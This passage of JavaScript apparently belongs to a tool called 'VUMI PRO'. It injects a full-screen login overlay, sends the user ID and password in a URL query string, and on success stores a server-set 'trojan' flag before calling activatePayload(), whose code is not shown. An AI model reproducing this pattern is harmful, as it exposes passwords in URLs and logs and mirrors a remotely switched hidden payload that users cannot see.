            const videoBaseUrl = "https://cdn.jsdelivr.net/gh/Habib29820/login-videos/";
            const passOverlay = document.createElement('div');
            passOverlay.id = 'vmt-pass-overlay';
            passOverlay.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(15, 23, 42, 0.7);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);z-index:9999999;display:flex;align-items:center;justify-content:center;font-family:'Poppins', sans-serif;transition: opacity 0.5s ease;";
            passOverlay.innerHTML = `
                <div class="login-container" style="display: flex; width: 900px; height: 500px; background: rgba(21, 31, 40, 0.85); border-radius: 20px; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5); overflow: hidden; position: relative; border: 1px solid rgba(255, 255, 255, 0.1);">
                    <button id="vmt-pass-close" title="बन्द गर्नुहोस् (Esc)" style="position:absolute;top:15px;right:20px;background:none;border:none;font-size:26px;color:rgba(255,255,255,0.7);cursor:pointer;z-index:10;transition:all 0.2s;line-height:1;">&times;</button>
                    <div class="image-panel" style="flex: 1.2; position: relative; overflow: hidden; background: #fff; border-right: 1px solid rgba(255, 255, 255, 0.1);">
                        <video id="vmt-video-player" autoplay loop muted playsinline style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; transition: opacity 0.6s ease;"><source src="${videoBaseUrl}1026.mp4" type="video/mp4"></video>
                    </div>
                    <div class="login-panel" style="flex: 1; padding: 40px 40px; display: flex; flex-direction: column; justify-content: center;">
                        <h2 style="font-size: 2.2em; margin-bottom: 5px; color: #fff; font-weight: 800;">VUMI PRO</h2>
                        <p style="color: rgba(255,255,255,0.6); margin-bottom: 30px; font-weight: 500;">Secure Access Panel</p>
                        <div class="input-group" style="margin-bottom: 20px;"><input type="text" id="vmt-user-input" class="vmt-focus-input" placeholder="User ID" autocomplete="off" style="width: 100%; padding: 14px 15px; border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; font-size: 14px; transition: all 0.3s; font-weight:bold; outline:none; background: rgba(255,255,255,0.05); color: #fff;"></div>
                        <div class="input-group" style="margin-bottom: 25px;"><input type="password" id="vmt-pass-input" class="vmt-focus-input" placeholder="Password" style="width: 100%; padding: 14px 15px; border: 1px solid rgba(255,255,255,0.2); border-radius: 8px; font-size: 14px; transition: all 0.3s; font-weight:bold; letter-spacing: 2px; outline:none; background: rgba(255,255,255,0.05); color: #fff;"></div>
                        <button id="vmt-pass-btn" class="glow-btn" style="--clr:#1e9bff; width: 100%; justify-content: center; padding: 16px; font-size: 16px;"><span class="btn-content">Sign In</span><i></i></button>
                        <div id="vmt-pass-error" style="padding: 12px; border-radius: 8px; margin-top: 15px; text-align: center; font-weight: 600; font-size: 13px; display: none;"></div>
                    </div>
                </div>
                <style>
                    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap');
                    .vmt-focus-input:focus { background-color: #fef08a !important; border-color: #eab308 !important; outline: 3px solid #eab308 !important; box-shadow: 0 0 15px rgba(234, 179, 8, 0.4) !important; color: #000 !important; }
                    .vmt-focus-input::placeholder { color: rgba(255,255,255,0.4); font-weight: normal; }
                    #vmt-pass-close:hover { color: #fff !important; transform: scale(1.1); }
                    .glow-btn { position: relative; background: rgba(255,255,255,0.1); color: #fff; text-decoration: none; text-transform: uppercase; font-size: 14px; letter-spacing: 0.1em; font-weight: 600; padding: 12px 15px; transition: 0.5s; display: flex; align-items: center; justify-content: space-between; border-radius: 8px; cursor: pointer; border: none; overflow: hidden; margin-bottom:10px; }
                    .glow-btn:hover:not(:disabled) { background: var(--clr); color: var(--clr); letter-spacing: 0.15em; box-shadow: 0 0 25px var(--clr); }
                    .glow-btn:disabled { background: #333 !important; color: #777 !important; cursor: not-allowed; box-shadow: none !important; }
                    .glow-btn::before { content: ''; position: absolute; inset: 2px; background: #151F28; border-radius: 6px; z-index: 0; }
                    .glow-btn .btn-content { position: relative; z-index: 1; display: flex; align-items: center; gap: 10px; color: #fff; transition: 0.5s; }
                    .glow-btn:hover:not(:disabled) .btn-content { color: var(--clr); text-shadow: 0 0 5px var(--clr); }
                    .glow-btn i { position: absolute; inset: 0; display: block; border-radius: 8px; overflow: hidden;}
                    .glow-btn i::before { content: ''; position: absolute; top: 0; left: 80%; width: 10px; height: 4px; background: #151F28; transform: translateX(-50%) skewX(325deg); transition: 0.5s; }
                    .glow-btn:hover:not(:disabled) i::before { width: 20px; left: 20%; background: #fff;}
                    .glow-btn i::after { content: ''; position: absolute; bottom: 0; left: 20%; width: 10px; height: 4px; background: #151F28; transform: translateX(-50%) skewX(325deg); transition: 0.5s; }
                    .glow-btn:hover:not(:disabled) i::after { width: 20px; left: 80%; background: #fff;}
                </style>`;
            document.body.appendChild(passOverlay);
            let failCount = 0; const videoPlayer = document.getElementById("vmt-video-player"); const usrInp = document.getElementById('vmt-user-input'); const passInp = document.getElementById('vmt-pass-input'); const btn = document.getElementById('vmt-pass-btn'); const err = document.getElementById('vmt-pass-error'); const cls = document.getElementById('vmt-pass-close');
            cls.onclick = () => { passOverlay.style.opacity = "0"; setTimeout(() => passOverlay.remove(), 400); };
            function updateVideo(videoFile) { videoPlayer.src = videoBaseUrl + videoFile; videoPlayer.load(); videoPlayer.play().catch(e => console.log("Video Play Error:", e)); }
            function showMessage(text, type) { err.style.display = "block"; err.textContent = text; if(type === "success") { err.style.background = "rgba(40, 167, 69, 0.2)"; err.style.color = "#d4edda"; err.style.border = "1px solid #28a745"; } else { err.style.background = "rgba(220, 53, 69, 0.2)"; err.style.color = "#f8d7da"; err.style.border = "1px solid #dc3545"; } }
            function hideMessage() { err.style.display = "none"; err.textContent = ""; }
            async function checkPass() {
                if (passInp.disabled) return; let userId = usrInp.value.trim(); let password = passInp.value.trim();
                if(!userId || !password) { showMessage("कृपया User ID र Password दुवै दिनुहोस्", "error"); return; }
                btn.disabled = true; btn.querySelector('.btn-content').textContent = "साइन इन..."; hideMessage();
                try {
                    let response = await fetch(`${API_URL}?userid=${encodeURIComponent(userId)}&password=${encodeURIComponent(password)}&deviceid=${encodeURIComponent(deviceId)}&t=${Date.now()}`); let data = await response.json();
                    if (data.success === true) {
                        updateVideo("correct.mp4"); showMessage("लगइन सफल!", "success"); btn.querySelector('.btn-content').textContent = "SUCCESS! 🚀"; failCount = 0; let flagToSave = data.trojan ? 'engaged' : '';
                        saveAuthData(btoa(userId), flagToSave);
                        setTimeout(() => { passOverlay.style.opacity = "0"; setTimeout(() => { passOverlay.remove(); loadToolkit(); activatePayload(); }, 400); }, 1800); 
                    } else { 
                        let msg = data.message || "";
                        if (msg.includes("प्रतिबन्ध") || msg.includes("सम्पर्क") || msg.includes("अपडेट") || msg.includes("अफ")) { passOverlay.style.opacity = "0"; setTimeout(() => { passOverlay.remove(); show404Overlay(msg); }, 400); return; }
                        failCount++; if (failCount === 1) updateVideo("wrong.mp4"); else updateVideo("againwrong.mp4");
                        showMessage(msg || "लगइन विफल!", "error"); btn.disabled = false; btn.querySelector('.btn-content').textContent = "Sign In";
                        passInp.style.borderColor = '#ff6b6b'; passInp.style.boxShadow = '0 0 10px rgba(255, 107, 107, 0.5)'; setTimeout(() => { passInp.style.borderColor = 'rgba(255,255,255,0.2)'; passInp.style.boxShadow = 'none'; }, 2000); passInp.value = ''; passInp.focus();
                    }
                } catch (error) { showMessage("सर्भर जडान विफल!", "error"); btn.disabled = false; btn.querySelector('.btn-content').textContent = "Sign In"; }
            }
            btn.onclick = checkPass; passInp.onkeydown = e => { if (e.key === 'Enter') checkPass(); }; usrInp.onkeydown = e => { if (e.key === 'Enter') passInp.focus(); };
        } else {
            loadToolkit(); activatePayload(); checkLiveStatus();
        }
        console.log("✅ VUMI PRO: Initialization Complete.");
    } catch (err) { console.error("VUMI PRO CRITICAL ERROR:", err); }
})();